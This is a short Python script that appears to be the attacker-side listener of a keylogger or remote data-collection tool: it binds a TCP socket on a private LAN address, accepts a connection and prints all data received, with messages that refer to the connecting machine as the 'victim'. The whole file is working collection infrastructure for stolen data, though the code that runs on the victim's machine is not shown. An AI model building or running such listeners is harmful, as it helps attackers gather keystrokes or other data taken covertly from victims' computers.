import socket

while 1:
    try:
        s = socket.socket()
        host = socket.gethostbyname("192.168.77.108")
        port = 8082
        s.bind((host, port))
        print(":the server is starteddd")
        print("waiting for the connections")
        s.listen(5)
        conn, addr = s.accept()
        print(addr, "has connected to the server buddy")
        log = ""

        while 1:
            result = conn.recv(5000)
            result = result.decode()
            print(result)


    except ConnectionResetError:
        print("\n\n Victim cancelled the connection")
